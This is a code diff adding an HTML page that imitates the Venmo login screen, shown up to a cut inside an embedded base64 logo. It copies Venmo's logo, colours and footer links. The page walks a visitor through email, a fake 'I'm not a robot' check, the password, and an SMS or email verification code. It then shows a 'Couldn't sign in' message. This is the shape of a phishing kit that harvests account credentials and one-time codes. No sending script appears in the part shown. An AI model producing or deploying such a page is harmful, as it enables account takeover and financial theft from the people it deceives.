@@ -1,0 +1,1066 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+<title>Venmo - Log In</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    background-color: #f3f5f7;
+    display: flex;
+    justify-content: center;
+    align-items: flex-start;
+    min-height: 100vh;
+    color: #0074DE;
+  }
+
+  .phone-container {
+    width: 100%;
+    max-width: 440px;
+    background: #f3f5f7;
+    min-height: 100vh;
+    position: relative;
+    overflow-x: hidden;
+    display: flex;
+    flex-direction: column;
+  }
+
+  /* Bordered card wrapping logo + form */
+  .login-card {
+    background: #fff;
+    margin: 24px 18px 0;
+    border: 1px solid #e6e9ec;
+    border-radius: 14px;
+    padding: 36px 24px 30px;
+    box-shadow: 0 1px 3px rgba(0,0,0,0.04);
+    display: flex;
+    flex-direction: column;
+    flex: 1;
+  }
+
+  /* Header - Venmo logo (official SVG) centered */
+  .venmo-header {
+    background: transparent;
+    padding: 0 0 28px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+  .venmo-logo {
+    width: 130px;
+    height: auto;
+  }
+
+  /* Steps */
+  .step { display: none; flex-direction: column; flex: 1; }
+  .step.active { display: flex; }
+
+  .step-title {
+    font-size: 24px;
+    color: #1c1c1c;
+    margin-bottom: 22px;
+    font-weight: 700;
+    letter-spacing: -0.4px;
+    text-align: center;
+  }
+
+  /* Input group - floating label */
+  .input-group {
+    margin-bottom: 16px;
+    position: relative;
+  }
+  .input-group input {
+    width: 100%;
+    padding: 22px 14px 8px 14px;
+    font-size: 16px;
+    border: 1.5px solid #c8c8c8;
+    border-radius: 10px;
+    background: #fff;
+    outline: none;
+    transition: border-color 0.2s, box-shadow 0.2s, padding 0.2s, background 0.2s;
+    color: #1c1c1c;
+    height: 56px;
+  }
+  .input-group input:focus {
+    border-color: #0074DE;
+    border-width: 2px;
+    padding: 21px 13px 7px 13px;
+    box-shadow: 0 0 0 3px rgba(0, 116, 222, 0.15);
+  }
+  .input-group input.error {
+    border-color: #E5484D;
+    border-width: 2px;
+    padding: 21px 13px 7px 13px;
+    background: #FFF6F6;
+  }
+  .input-group label {
+    position: absolute;
+    top: 50%;
+    left: 14px;
+    transform: translateY(-50%);
+    font-size: 16px;
+    color: #6c7378;
+    pointer-events: none;
+    transition: all 0.2s ease;
+    font-weight: 400;
+  }
+  .input-group input:focus + label,
+  .input-group input:not(:placeholder-shown) + label {
+    top: 11px;
+    transform: translateY(0);
+    font-size: 11px;
+    color: #0074DE;
+    font-weight: 600;
+  }
+  .input-group input.error + label,
+  .input-group input.error:not(:placeholder-shown) + label {
+    color: #E5484D;
+  }
+
+  /* Password field with eye toggle */
+  .input-group.with-icon input { padding-right: 44px; }
+  .toggle-eye {
+    position: absolute;
+    right: 12px;
+    top: 50%;
+    transform: translateY(-50%);
+    width: 26px;
+    height: 26px;
+    cursor: pointer;
+    color: #6c7378;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+  .toggle-eye svg { width: 22px; height: 22px; fill: currentColor; }
+
+  /* Error message */
+  .error-msg {
+    color: #E5484D;
+    font-size: 12px;
+    margin-top: 6px;
+    margin-left: 4px;
+    font-weight: 500;
+    display: none;
+  }
+  .error-msg.active { display: block; }
+
+  /* Email display row on password step */
+  .email-display {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    background: #F4F6F8;
+    padding: 12px 14px;
+    border-radius: 10px;
+    margin-bottom: 16px;
+  }
+  .email-display .email-text {
+    font-size: 15px;
+    color: #1c1c1c;
+    font-weight: 500;
+  }
+  .email-display .change-link {
+    color: #0074DE;
+    font-size: 14px;
+    text-decoration: none;
+    font-weight: 600;
+    cursor: pointer;
+  }
+  .email-display .change-link:hover { text-decoration: underline; }
+
+  /* Forgot password link */
+  .forgot-link {
+    color: #0074DE;
+    font-size: 14px;
+    text-decoration: none;
+    display: inline-block;
+    margin-bottom: 18px;
+    font-weight: 600;
+  }
+  .forgot-link:hover { text-decoration: underline; }
+
+  /* Next / Login button - Venmo blue */
+  .btn-next {
+    width: 100%;
+    padding: 15px;
+    background-color: #0074DE;
+    color: #fff;
+    border: none;
+    border-radius: 30px;
+    font-size: 16px;
+    font-weight: 700;
+    cursor: pointer;
+    transition: background-color 0.2s, transform 0.1s;
+    margin-bottom: 12px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 10px;
+    min-height: 52px;
+  }
+  .btn-next:hover { background-color: #005FBE; }
+  .btn-next:active { transform: scale(0.98); }
+  .btn-next:disabled { opacity: 0.7; cursor: not-allowed; }
+
+  /* Throbber (classic rotating-circle loading animation) */
+  .throbber {
+    display: none;
+    width: 22px;
+    height: 22px;
+    border-radius: 50%;
+    border: 2.5px solid rgba(255,255,255,0.3);
+    border-top-color: #fff;
+    animation: throbber-spin 0.9s linear infinite;
+  }
+  @keyframes throbber-spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+  }
+
+  /* Sign up button - white outline; on hover becomes fully blue with white text */
+  .btn-signup {
+    width: 100%;
+    padding: 15px;
+    background-color: #fff;
+    color: #0074DE;
+    border: 1.5px solid #0074DE;
+    border-radius: 30px;
+    font-size: 16px;
+    font-weight: 700;
+    cursor: pointer;
+    transition: background-color 0.2s, color 0.2s;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    min-height: 52px;
+    text-decoration: none;
+  }
+  .btn-signup:hover {
+    background-color: #0074DE;
+    color: #fff;
+  }
+
+  /* reCAPTCHA box */
+  .recaptcha-container {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    border: 1px solid #d8d8d8;
+    border-radius: 8px;
+    background: #f9f9f9;
+    padding: 14px 16px;
+    margin: 8px 0 24px;
+    height: 72px;
+    cursor: pointer;
+    transition: background 0.2s, border-color 0.2s;
+    user-select: none;
+  }
+  .recaptcha-container:hover { background: #f4f4f4; border-color: #b8b8b8; }
+  .recaptcha-container.disabled { cursor: default; }
+  .recaptcha-left { display: flex; align-items: center; flex: 1; }
+  .recaptcha-checkbox {
+    width: 26px;
+    height: 26px;
+    border: 2px solid #b8b8b8;
+    border-radius: 3px;
+    background: #fff;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    position: relative;
+    transition: border-color 0.2s;
+    flex-shrink: 0;
+  }
+  .recaptcha-checkbox:hover { border-color: #555; }
+  .recaptcha-checkbox.verifying { border-color: #0074DE; }
+  .recaptcha-checkbox.verified { border-color: #00C853; background: #fff; }
+  .recaptcha-spinner {
+    width: 22px;
+    height: 22px;
+    border-radius: 50%;
+    border: 2.5px solid #e0e0e0;
+    border-top: 2.5px solid #0074DE;
+    animation: recaptcha-spin 0.9s linear infinite;
+    display: none;
+  }
+  @keyframes recaptcha-spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+  }
+  .recaptcha-check {
+    display: none;
+    width: 22px;
+    height: 22px;
+  }
+  .recaptcha-text-area {
+    display: flex;
+    flex-direction: column;
+    margin-left: 12px;
+  }
+  .recaptcha-text {
+    font-size: 14px;
+    color: #333;
+    font-weight: 500;
+    line-height: 1.2;
+  }
+  .recaptcha-status {
+    font-size: 12px;
+    color: #888;
+    margin-top: 2px;
+    line-height: 1.2;
+  }
+  .recaptcha-status.verifying { color: #555; }
+  .recaptcha-status.success { color: #00C853; font-weight: 600; }
+  .recaptcha-logo {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    margin-left: 12px;
+    flex-shrink: 0;
+  }
+  .recaptcha-logo-icon {
+    width: 30px;
+    height: 30px;
+    background: #0074DE;
+    border-radius: 3px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: #fff;
+  }
+  .recaptcha-logo-icon svg { width: 18px; height: 18px; fill: #fff; }
+  .recaptcha-logo-text {
+    font-size: 9px;
+    color: #888;
+    margin-top: 3px;
+    letter-spacing: 0.3px;
+  }
+
+  /* OTP Input */
+  .otp-input {
+    text-align: center;
+    letter-spacing: 6px;
+    font-size: 20px;
+  }
+
+  /* Full Screen Loading */
+  .full-loading {
+    display: none;
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: #fff;
+    z-index: 9998;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    text-align: center;
+  }
+  .full-loading.active { display: flex; }
+  .full-loading .venmo-logo-load {
+    width: 130px;
+    height: auto;
+    margin-bottom: 36px;
+  }
+  .full-loading-text {
+    color: #1c1c1c;
+    font-size: 16px;
+    font-weight: 500;
+    margin-top: 22px;
+    letter-spacing: 0.2px;
+  }
+  .big-throbber {
+    width: 46px;
+    height: 46px;
+    border-radius: 50%;
+    border: 3.5px solid #E5E9EE;
+    border-top-color: #0074DE;
+    animation: throbber-spin 1s linear infinite;
+  }
+
+  /* Error box */
+  .error-box {
+    display: none;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    text-align: center;
+    padding: 70px 30px;
+    background: #fff;
+    min-height: 70vh;
+  }
+  .error-box.active { display: flex; }
+  .error-box svg {
+    width: 64px;
+    height: 64px;
+    fill: #0074DE;
+    margin-bottom: 22px;
+  }
+  .error-box h3 {
+    font-size: 22px;
+    color: #0074DE;
+    margin-bottom: 12px;
+    font-weight: 700;
+  }
+  .error-box p {
+    font-size: 15px;
+    color: #555;
+    margin-bottom: 30px;
+    line-height: 1.5;
+  }
+
+  /* Alert modal */
+  .alert-overlay {
+    display: none;
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(0,0,0,0.5);
+    z-index: 9999;
+    justify-content: center;
+    align-items: center;
+    padding: 20px;
+  }
+  .alert-overlay.active { display: flex; }
+  .alert-box {
+    background: #fff;
+    width: 100%;
+    max-width: 340px;
+    border-radius: 12px;
+    overflow: hidden;
+    box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+    animation: scaleIn 0.2s ease-in-out;
+  }
+  @keyframes scaleIn { from { transform: scale(0.9); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+  .alert-header {
+    background: #0074DE;
+    color: #fff;
+    padding: 15px 20px;
+    font-size: 16px;
+    font-weight: 600;
+  }
+  .alert-body {
+    padding: 25px 20px;
+    text-align: center;
+    color: #333;
+    font-size: 14px;
+    line-height: 1.5;
+  }
+  .alert-btn-row { display: flex; justify-content: center; padding: 0 20px 20px; }
+  .alert-btn {
+    background: #0074DE;
+    color: #fff;
+    border: none;
+    padding: 10px 30px;
+    font-size: 14px;
+    font-weight: 600;
+    cursor: pointer;
+    border-radius: 6px;
+  }
+
+  /* Footer */
+  .venmo-footer {
+    background: transparent;
+    padding: 18px 24px 24px;
+    text-align: center;
+    margin-top: auto;
+  }
+  .footer-links {
+    display: flex;
+    justify-content: center;
+    flex-wrap: wrap;
+    gap: 12px 20px;
+    margin-bottom: 6px;
+  }
+  .footer-links a {
+    color: #6c7378;
+    text-decoration: none;
+    font-size: 12px;
+    font-weight: 500;
+  }
+  .footer-links a:hover { color: #0074DE; text-decoration: underline; }
+  .copyright {
+    color: #999;
+    font-size: 11px;
+    margin-top: 8px;
+  }
+
+  @media (max-width: 480px) {
+    .login-card { margin: 16px 12px 0; padding: 30px 20px 26px; }
+  }
+    /* Your existing styles */
+
+  .popup-overlay {
+    display: none;
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(0, 0, 0, 0.5);
+    z-index: 9999;
+    justify-content: center;
+    align-items: center;
+    padding: 20px;
+  }
+  .popup-box {
+    background: #fff;
+    width: 100%;
+    max-width: 340px;
+    border-radius: 12px;
+    overflow: hidden;
+    box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+    animation: scaleIn 0.2s ease-in-out;
+  }
+  @keyframes scaleIn { from { transform: scale(0.9); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+  .popup-header {
+    background: #0074DE;
+    color: #fff;
+    padding: 15px 20px;
+    font-size: 16px;
+    font-weight: 600;
+  }
+  .popup-body {
+    padding: 25px 20px;
+    text-align: center;
+    color: #333;
+    font-size: 14px;
+    line-height: 1.5;
+  }
+  .popup-btn-row { display: flex; justify-content: center; padding: 0 20px 20px; }
+  .popup-btn {
+    background: #0074DE;
+    color: #fff;
+    border: none;
+    padding: 10px 30px;
+    font-size: 14px;
+    font-weight: 600;
+    cursor: pointer;
+    border-radius: 6px;
+  }
+  .popup-btn:hover { background: #005FBE; }
+</style>
+</head>
+<body>
+
+<div class="phone-container">
+
+  <!-- Bordered white card wrapping logo + all steps -->
+  <div class="login-card">
+
+    <!-- Header - official Venmo SVG logo -->
+    <div class="venmo-header">
+      <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjExIiBoZWlnaHQ9IjQxIiB2aWV3Qm94PSIwIDAgMjExIDQxIiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgogIDxwYXRoIGQ9Ik0zNC41NzcxIDAuODIyMDIxQzM1Ljk5NzQgMy4xNjczMyAzNi42Mzc3IDUuNTgzMDEgMzYuNjM3NyA4LjYzNDUxQzM2LjYzNzcgMTguMzY3MiAyOC4zMjc3IDMxLjAxMDcgMjEuNTgzMiAzOS44ODg4SDYuMTc4MjVMMCAyLjk1Mjk2TDEzLjQ4ODcgMS42NzI1OEwxNi43NTUyIDI3Ljk1NDhDMTkuODA3NCAyMi45ODM0IDIzLjU3MzggMTUuMTcxIDIzLjU3MzggOS44NDQ1M0MyMy41NzM4IDYuOTI5MDIgMjMuMDc0MyA0Ljk0MzE4IDIyLjI5MzUgMy4zMDgwNkwzNC41NzcxIDAuODIyMDIxWiIgZmlsbD0iIzAwOENGRiIvPgogIDxwYXRoIGQ9Ik01Mi4wNTk1IDE3LjA4ODdDNTQuNTQxNyAxNy4wODg3IDYwLjc5MDcgMTUuOTUzNCA2MC43OTA3IDEyLjQwMjRDNjAuNzkwNyAxMC42OTczIDU5LjU4NDggOS44NDY3NiA1OC4xNjM3IDkuODQ2NzZDNTUuNjc3NiA5Ljg0Njc2IDUyLjQxNSAxMi44Mjc1IDUyLjA1OTUgMTcuMDg4N1pNNTEuNzc1MSAyNC4xMjE0QzUxLjc3NTEgMjguNDU3MyA1NC4xODY1IDMwLjE1ODQgNTcuMzgzNCAzMC4xNTg0QzYwLjg2NDcgMzAuMTU4NCA2NC4xOTc5IDI5LjMwNzggNjguNTMwMyAyNy4xMDY1TDY2Ljg5ODUgMzguMTg1MkM2My44NDYgMzkuNjc2MyA1OS4wODg4IDQwLjY3MTMgNTQuNDcxMyA0MC42NzEzQzQyLjc1ODQgNDAuNjcxMyAzOC41NjY0IDMzLjU2OTMgMzguNTY2NCAyNC42OTA4QzM4LjU2NjQgMTMuMTgzNCA0NS4zODUzIDAuOTY0NiA1OS40NDM2IDAuOTY0NkM2Ny4xODM3IDAuOTY0NiA3MS41MTE3IDUuMzAwMTMgNzEuNTExNyAxMS4zMzcxQzcxLjUxMjQgMjEuMDY5NSA1OS4wMTg4IDI0LjA1MSA1MS43NzUxIDI0LjEyMTRaIiBmaWxsPSIjMDA4Q0ZGIi8+CiAgPHBhdGggZD0iTTExMC40MzkgOS4zNDgzNUMxMTAuNDM5IDEwLjc2ODcgMTEwLjIyNCAxMi44Mjg5IDExMC4wMDkgMTQuMTc1M0wxMDUuOTYyIDM5Ljc0NzRIOTIuODI3NUw5Ni41MTk2IDE2LjMwNTlDOTYuNTg5NiAxNS42NzAxIDk2LjgwNDggMTQuMzkwMSA5Ni44MDQ4IDEzLjY3OTlDOTYuODA0OCAxMS45NzQ3IDk1LjczOTMgMTEuNTQ5MyA5NC40NTgzIDExLjU0OTNDOTIuNzU2OCAxMS41NDkzIDkxLjA1MTMgMTIuMzI5OCA4OS45MTU1IDEyLjg5OTdMODUuNzI3OCAzOS43NDc3SDcyLjUxOTVMNzguNTUzNyAxLjQ2MTg1SDg5Ljk4NTVMOTAuMTMwMiA0LjUxNzczQzkyLjgyNzIgMi43NDIyNCA5Ni4zNzg1IDAuODIyMDIyIDEwMS40MTcgMC44MjIwMjJDMTA4LjA5MyAwLjgyMTI5MiAxMTAuNDM5IDQuMjMxOSAxMTAuNDM5IDkuMzQ4MzVaIiBmaWxsPSIjMDA4Q0ZGIi8+CiAgPHBhdGggZD0iTTE0OS40MzIgNS4xNTU3N0MxNTMuMTk0IDIuNDU5MzYgMTU2Ljc0NiAwLjk2NDYgMTYxLjY0MyAwLjk2NDZDMTY4LjM4NyAwLjk2NDYgMTcwLjczMyA0LjM3NTIxIDE3MC43MzMgOS40OTE2N0MxNzAuNzMzIDEwLjkxMjEgMTcwLjUxOCAxMi45NzIzIDE3MC4zMDQgMTQuMzE4N0wxNjYuMjYxIDM5Ljg5MDdIMTUzLjEyM0wxNTYuODg2IDE1Ljk1MzhDMTU2Ljk1NSAxNS4zMTM5IDE1Ny4xMDEgMTQuNTMzNCAxNTcuMTAxIDE0LjAzODNDMTU3LjEwMSAxMi4xMTg0IDE1Ni4wMzUgMTEuNjkyNiAxNTQuNzU0IDExLjY5MjZDMTUzLjEyMyAxMS42OTI2IDE1MS40OTIgMTIuNDAyOCAxNTAuMjgxIDEzLjA0M0wxNDYuMDk0IDM5Ljg5MTFIMTMyLjk2TDEzNi43MjIgMTUuOTU0MUMxMzYuNzkxIDE1LjMxNDMgMTM2LjkzMyAxNC41MzM4IDEzNi45MzMgMTQuMDM4N0MxMzYuOTMzIDEyLjExODggMTM1Ljg2NiAxMS42OTMgMTM0LjU5IDExLjY5M0MxMzIuODg1IDExLjY5MyAxMzEuMTgzIDEyLjQ3MzUgMTMwLjA0NyAxMy4wNDM0TDEyNS44NTYgMzkuODkxNUgxMTIuNjUyTDExOC42ODYgMS42MDU1MkgxMjkuOTc4TDEzMC4zMzMgNC44MDE3NkMxMzIuOTYgMi44ODYyOCAxMzYuNTA4IDAuOTY2MDU3IDE0MS4yNjUgMC45NjYwNTdDMTQ1LjM4NCAwLjk2NDU5OSAxNDguMDggMi43NDA0NSAxNDkuNDMyIDUuMTU1NzdaIiBmaWxsPSIjMDA4Q0ZGIi8+CiAgPHBhdGggZD0iTTE5Ni44NjkgMTYuMzA3NkMxOTYuODY5IDEzLjE4MjEgMTk2LjA4NyAxMS4wNTEyIDE5My43NDYgMTEuMDUxMkMxODguNTYzIDExLjA1MTIgMTg3LjQ5OCAyMC4yMTMzIDE4Ny40OTggMjQuOTAwM0MxODcuNDk4IDI4LjQ1NiAxODguNDkzIDMwLjY1NjYgMTkwLjgzNCAzMC42NTY2QzE5NS43MzMgMzAuNjU2NiAxOTYuODY5IDIwLjk5NDIgMTk2Ljg2OSAxNi4zMDc2Wk0xNzQuMTUgMjQuMzM0NUMxNzQuMTUgMTIuMjYwOCAxODAuNTM5IDAuOTYzMzc5IDE5NS4yMzggMC45NjMzNzlDMjA2LjMxNCAwLjk2MzM3OSAyMTAuMzYzIDcuNDk5ODUgMjEwLjM2MyAxNi41MjJDMjEwLjM2MyAyOC40NTU2IDIwNC4wNDMgNDAuODE0IDE4OC45ODkgNDAuODE0QzE3Ny44NDIgNDAuODE0IDE3NC4xNSAzMy40OTcgMTc0LjE1IDI0LjMzNDVaIiBmaWxsPSIjMDA4Q0ZGIi8+Cjwvc3ZnPg==" class="venmo-logo" alt="venmo" />
+    </div>
+
+    <!-- STEP 1: Email / Username -->
+    <div id="step1" class="step active">
+      <div class="step-title">Log in</div>
+
+      <div class="input-group">
+        <input type="text" id="email" autocomplete="off" placeholder=" " />
+        <label for="email">Enter email, mobile, or username</label>
+      </div>
+      <div class="error-msg" id="emailError">Your information is required.</div>
+
+      <button class="btn-next" id="nextBtn1">
+        <span id="nextBtn1Text">Next</span>
+        <div class="throbber" id="spinner1"></div>
+      </button>
+
+      <a href="https://account.venmo.com/signup" class="btn-signup">Sign up</a>
+    </div>
+
+    <!-- STEP 2: Confirm you are not a robot -->
+    <div id="step2" class="step">
+      <div class="step-title">Confirm you're not a robot</div>
+
+      <div class="recaptcha-container" id="recaptchaContainer">
+        <div class="recaptcha-left">
+          <div class="recaptcha-checkbox" id="recaptchaCheckbox">
+            <div class="recaptcha-spinner" id="recaptchaSpinner"></div>
+            <svg class="recaptcha-check" id="recaptchaCheck" viewBox="0 0 24 24">
+              <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z" fill="#00C853"/>
+            </svg>
+          </div>
+          <div class="recaptcha-text-area">
+            <div class="recaptcha-text" id="recaptchaText">I'm not a robot</div>
+            <div class="recaptcha-status" id="recaptchaStatus"></div>
+          </div>
+        </div>
+        <div class="recaptcha-logo">
+          <div class="recaptcha-logo-icon">
+            <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.94-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/></svg>
+          </div>
+          <div class="recaptcha-logo-text">reCAPTCHA</div>
+        </div>
+      </div>
+
+      <button class="btn-next" id="nextBtn2" disabled style="opacity:0.5; cursor:not-allowed;">
+        <span id="nextBtn2Text">Continue</span>
+        <div class="throbber" id="spinner2"></div>
+      </button>
+    </div>
+
+    <!-- STEP 3: Password -->
+    <div id="step3" class="step">
+      <div class="step-title">Enter password</div>
+
+      <div class="email-display">
+        <div class="email-text" id="emailDisplay"></div>
+        <div class="change-link" id="changeEmail">Change</div>
+      </div>
+
+      <div class="input-group with-icon">
+        <input type="password" id="password" autocomplete="off" placeholder=" " />
+        <label for="password">Password</label>
+        <div class="toggle-eye" id="toggleEye">
+          <svg viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
+        </div>
+      </div>
+      <div class="error-msg" id="passwordError">Your password is required.</div>
+
+      <a href="https://id.venmo.com/signin?country.x=US&locale.x=en&ctxId=AAG9vTOxvg1qxfthbOGuW6ocy5qZ9xZJ3iOyQqX_zmI-594fOCLtOWgu97OVH5Ed4uzE8IMTSw6k2TFvs6lUTdw=&YWRzZGRjYXB0Y2hh=1#/password-recovery" class="forgot-link">Forgot password?</a>
+
+      <button class="btn-next" id="nextBtn3">
+        <span id="nextBtn3Text">Next</span>
+        <div class="throbber" id="spinner3"></div>
+      </button>
+
+      <a href="https://account.venmo.com/signup" class="btn-signup">Sign up</a>
+    </div>
+
+    <!-- STEP 4: OTP Verify -->
+    <div id="step4" class="step">
+      <div class="step-title">Check your code</div>
+      <p style="font-size:14px; color:#555; margin-bottom:18px; line-height:1.5; text-align:center;">Check your email or SMS for the verification code, or approve the login on your Venmo app.</p>
+
+      <div class="input-group">
+        <input type="text" id="otpCode" class="otp-input" maxlength="8" inputmode="numeric" pattern="[0-9]*" autocomplete="off" placeholder=" " />
+        <label for="otpCode">Enter Code</label>
+      </div>
+      <div class="error-msg" id="otpError">The verification code is required.</div>
+
+      <button class="btn-next" id="loginBtn4">
+        <span id="loginBtn4Text">Log in</span>
+        <div class="throbber" id="spinner4"></div>
+      </button>
+    </div>
+
+    <!-- ERROR BOX -->
+    <div id="errorBox" class="error-box">
+      <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
+      <h3>Couldn't sign in</h3>
+      <p>There was a problem signing into Venmo web.<br/>Try using the Venmo mobile app instead.</p>
+    </div>
+
+  </div>
+
+  <!-- Footer -->
+  <div class="venmo-footer">
+    <div class="footer-links">
+      <a href="https://help.venmo.com/" target="_blank">Help</a>
+      <a href="https://venmo.com/legal/us-user-agreement/" target="_blank">Terms</a>
+      <a href="https://venmo.com/legal/privacy-policy/" target="_blank">Privacy</a>
+    </div>
+    <div class="copyright">
+      <p>© 2026 PayPal, Inc. All rights reserved.</p>
+    </div>
+  </div>
+
+</div>
+
+<!-- Full Screen Loading -->
+<div id="fullLoading" class="full-loading">
+  <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjExIiBoZWlnaHQ9IjQxIiB2aWV3Qm94PSIwIDAgMjExIDQxIiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgogIDxwYXRoIGQ9Ik0zNC41NzcxIDAuODIyMDIxQzM1Ljk5NzQgMy4xNjczMyAzNi42Mzc3IDUuNTgzMDEgMzYuNjM3NyA4LjYzNDUxQzM2LjYzNzcgMTguMzY3MiAyOC4zMjc3IDMxLjAxMDcgMjEuNTgzMiAzOS44ODg4SDYuMTc4MjVMMCAyLjk1Mjk2TDEzLjQ4ODcgMS42NzI1OEwxNi43NTUyIDI3Ljk1NDhDMTkuODA3NCAyMi45ODM0IDIzLjU3MzggMTUuMTcxIDIzLjU3MzggOS44NDQ1M0MyMy41NzM4IDYuOTI5MDIgMjMuMDc0MyA0Ljk0MzE4IDIyLjI5MzUgMy4zMDgwNkwzNC41NzcxIDAuODIyMDIxWiIgZmlsbD0iIzAwOENGRiIvPgogIDxwYXRoIGQ9Ik01Mi4wNTk1IDE3LjA4ODdDNTQuNTQxNyAxNy4wODg3IDYwLjc5MDcgMTUuOTUzNCA2MC43OTA3IDEyLjQwMjRDNjAuNzkwNyAxMC42OTczIDU5LjU4NDggOS44NDY3NiA1OC4xNjM3IDkuODQ2NzZDNTUuNjc3NiA5Ljg0Njc2IDUyLjQxNSAxMi44Mjc1IDUyLjA1OTUgMTcuMDg4N1pNNTEuNzc1MSAyNC4xMjE0QzUxLjc3NTEgMjguNDU3MyA1NC4xODY1IDMwLjE1ODQgNTcuMzgzNCAzMC4xNTg0QzYwLjg2NDcgMzAuMTU4NCA2NC4xOTc5IDI5LjMwNzggNjguNTMwMyAyNy4xMDY1TDY2Ljg5ODUgMzguMTg1MkM2My44NDYgMzkuNjc2MyA1OS4wODg4IDQwLjY3MTMgNTQuNDcxMyA0MC42NzEzQzQyLjc1ODQgNDAuNjcxMyAzOC41NjY0IDMzLjU2OTMgMzguNTY2NCAyNC42OTA4QzM4LjU2NjQgMTMuMTgzNCA0NS4zODUzIDAuOTY0NiA1OS40NDM2IDAuOTY0NkM2Ny4xODM3IDAuOTY0NiA3MS41MTE3IDUuMzAwMTMgNzEuNTExNyAxMS4zMzcxQzcxLjUxMjQgMjEuMDY5NSA1OS4wMTg4IDI0LjA1MSA1MS43NzUxIDI0LjEyMTRaIiBmaWxsPSIjMDA4Q0ZGIi8+CiAgPHBhdGggZD0iTTExMC40MzkgOS4zNDgzNUMxMTAuNDM5IDEwLjc2ODcgMTEwLjIyNCAxMi44Mjg5IDExMC4wMDkgMTQuMTc1M0wxMDUuOTYyIDM5Ljc0NzRIOTIuODI3NUw5Ni41MTk2IDE2LjMwNTlDOTYuNTg5NiAxNS42NzAxIDk2LjgwNDggMTQuMzkwMSA5Ni44MDQ4IDEzLjY3OTlDOTYuODA0OCAxMS45NzQ3IDk1LjczOTMgMTEuNTQ5MyA5NC40NTgzIDExLjU0OTNDOTIuNzU2OCAxMS41NDkzIDkxLjA1MTMgMTIuMzI5OCA4OS45MTU1IDEyLjg5OTdMODUuNzI3OCAzOS43NDc3SDcyLjUxOTVMNzguNTUzNyAxLjQ2MTg1SDg5Ljk4NTVMOTAuMTMwMiA0LjUxNzczQzkyLjgyNzIgMi43NDIyNCA5Ni4zNzg1IDAuODIyMDIyIDEwMS40MTcgMC44MjIwMjJDMTA4LjA5MyAwLjgyMTI5MiAxMTAuNDM5IDQuMjMxOSAxMTAuNDM5IDkuMzQ4MzVaIiBmaWxsPSIjMDA4Q0ZGIi8+CiAgPHBhdGggZD0iTTE0OS40MzIgNS4xNTU3N0MxNTMuMTk0IDIuNDU5MzYgMTU2Ljc0NiAwLjk2NDYgMTYxLjY0MyAwLjk2NDZDMTY4LjM4NyAwLjk2NDYgMTcwLjczMyA0LjM3NTIxIDE3MC43MzMgOS40OTE2N0MxNzAuNzMzIDEwLjkxMjEgMTcwLjUxOCAxMi45NzIzIDE3MC4zMDQgMTQuMzE4N0wxNjYuMjYxIDM5Ljg5MDdIMTUzLjEyM0wxNTYuODg2IDE1Ljk1MzhDMTU2Ljk1NSAxNS4zMTM5IDE1Ny4xMDEgMTQuNTMzNCAxNTcuMTAxIDE0LjAzODNDMTU3LjEwMSAxMi4xMTg0IDE1Ni4wMzUgMTEuNjkyNiAxNTQuNzU0IDExLjY5MjZDMTUzLjEyMyAxMS42OTI2IDE1MS40OTIgMTIuNDAyOCAxNTAuMjgxIDEzLjA0M0wxNDYuMDk0IDM5Ljg5MTFIMTMyLjk2TDEzNi43MjIgMTUuOTU0MUMxMzYuNzkxIDE1LjMxNDMgMTM2LjkzMyAxNC41MzM4IDEzNi45MzMgMTQuMDM4N0MxMzYuOTMzIDEyLjExODggMTM1Ljg2NiAxMS42OTMgMTM0LjU5IDExLjY5M0MxMzIuODg1IDExLjY5MyAxMzEu